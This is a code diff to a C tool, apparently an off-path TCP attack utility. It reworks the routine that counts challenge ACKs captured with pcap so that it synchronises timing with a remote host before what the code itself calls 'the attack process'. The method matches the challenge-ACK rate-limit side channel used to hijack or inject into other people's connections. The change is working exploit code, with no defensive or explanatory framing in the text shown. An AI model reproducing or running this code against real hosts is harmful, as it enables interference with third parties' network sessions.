@@ -287,10 +287,13 @@ void *send_thread(void *arg)
 /*
  * a thread to receive packets =)
  */
+
+static int g_chack_cnt = 0;
+
 void *recv_thread(void *arg)
 {
 	thctx_t *pctx;
-	int chack_cnt = 0;
+	//int chack_cnt = 0;
 	struct timeval listen_start, now, diff;
 	struct pcap_pkthdr *pchdr = NULL;
 	const u_char *inbuf = NULL;
@@ -302,8 +305,9 @@ void *recv_thread(void *arg)
 
 	/* listen for acks for 2 seconds */
 	//printf("[*] Waiting 2 seconds for challenge ACKs...\n");
-	gettimeofday(&listen_start, NULL);
-	do {
+	//gettimeofday(&listen_start, NULL);
+	//do {
+	while (1) {
 		pcret = pcap_next_ex(pctx->pch, &pchdr, &inbuf);
 		if (pcret == 1
 			&& tcp_recv(pchdr, pctx->ipoff, inbuf, &flags, NULL, NULL, NULL, &datalen
@@ -312,18 +316,20 @@ void *recv_thread(void *arg)
 #endif
 				)
 			&& flags == TH_ACK) {
-			chack_cnt++;
+			g_chack_cnt++;
 		}
-
+	}
+#if 0
 		gettimeofday(&now, NULL);
 		timersub(&now, &listen_start, &diff);
 		//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
 	} while (diff.tv_sec < 2);
+#endif
 	//} while (diff.tv_sec < 1 || (diff.tv_sec == 1 && diff.tv_usec < 850000));
 	//} while (diff.tv_sec < 2 || (diff.tv_sec == 2 && diff.tv_usec < 50000));
 	//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
 
-	return (void *)chack_cnt;
+	return NULL; // (void *)chack_cnt;
 }
 
 
@@ -339,7 +345,7 @@ void *recv_thread(void *arg)
  */
 int sync_time_with_remote(thctx_t *pctx)
 {
-	int chack_cnt[3] = { 0 };
+	int chack_cnt[4] = { 0 };
 	int i, round = 0;
 	u_long old_seq;
 	char packet[8192];
@@ -359,25 +365,20 @@ int sync_time_with_remote(thctx_t *pctx)
 	pctx->packet = packet;
 	pctx->pktlen = pktlen;
 
-	while (1) {
-#ifdef DEBUG_SEND_TIME
-		struct timeval send_start;
-#endif
-#ifdef DEBUG_RECV_TIME
-		struct timeval recv_start;
+	/* spawn the recv thread first
+	 * it will live throughout the attack process...
+	 */
+	if (pthread_create(&rth, NULL, recv_thread, pctx)) {
+		fprintf(stderr, "[!] failed to start recv thread!\n");
+		return 0;
+	}
 
-		/* spawn the recv thread first */
-		gettimeofday(&recv_start, NULL);
-#endif
-		if (pthread_create(&rth, NULL, recv_thread, pctx)) {
-			fprintf(stderr, "[!] failed to start recv thread!\n");
-			return 0;
-		}
+	while (1) {
+		struct timeval round_start;
+
+		gettimeofday(&round_start, NULL);
 
 		/* spawn the send thread */
-#ifdef DEBUG_SEND_TIME
-		gettimeofday(&send_start, NULL);
-#endif
 		if (pthread_create(&sth, NULL, send_thread, pctx)) {
 			fprintf(stderr, "[!] failed to start send thread!\n");
 			pthread_cancel(rth);
@@ -390,29 +391,36 @@ int sync_time_with_remote(thctx_t *pctx)
 			pthread_cancel(rth);
 			return 0;
 		}
-#ifdef DEBUG_SEND_TIME
-		gettimeofday(&now, NULL);
-		timersub(&now, &send_start, &diff);
-		printf("send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
 
-		/* wait for the recv thread to terminate */
-		if (pthread_join(rth, (void **)&chack_cnt[round])) {
-			fprintf(stderr, "[!] failed to join recv thread!\n");
-			return 0;
-		}
+		/* wait for 2 seconds for challenge ACKs... */
+		do {
+			//printf("  ACKs recv'd: %d\n", g_chack_cnt);
+			//usleep(250000);
+			gettimeofday(&now, NULL);
+			timersub(&now, &round_start, &diff);
+		} while (diff.tv_sec < 2);
+		//printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
 
-		gettimeofday(&start, NULL); /* round finish start time */
-#ifdef DEBUG_RECV_TIME
-		timersub(&start, &recv_start, &diff);
-		printf("recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
-#endif
+		/* the delay before next round starts here.. */
+		memcpy(&start, &now, sizeof(start));
+
+		chack_cnt[round] = g_chack_cnt;
+		g_chack_cnt = 0;
 		printf("[*] Round %d - %d challenge acks\n", round + 1, chack_cnt[round]);
 
 		/* did we synch?? */
-		if (chack_cnt[round] == 100)
-			/* woot! */
-			break;
+		if (chack_cnt[round] == 100) {
+			if (round == 2) {
+				round++;
+				continue;
+			}
+			else if (round == 3)
+				break;
+
+			/* we got luck! verify... */
+			round = 2;
+			continue;
+		}
 
 		else if (chack_cnt[round] < 100) {
 			fprintf(stderr, "[!] invalid number of challenge ACKs! starting over...\n");
@@ -441,17 +449,16 @@ int sync_time_with_remote(thctx_t *pctx)
 				timersub(&now, &start, &diff);
 			} while ((uint64_t)diff.tv_usec < delay);
 			round++;
-		} else {
+		} else if (round == 2) {
+			 round++;
+		} else if (round == 3) {
 			/* start over :-/ */
-			fprintf(stderr, "[!] reached round 3 without success, restarting...\n");
+			fprintf(stderr, "[!] reached round 4 without success, restarting...\n");
 			round = 0;
 		}
 	}
 
 	printf("[*] Time synchronization complete!\n");
-	for (i = 0; i < 3; i++) {
-		printf("    Challenge acks round %d : %d\n", i + 1, chack_cnt[i]);
-	}
 
 	return 1;
 }
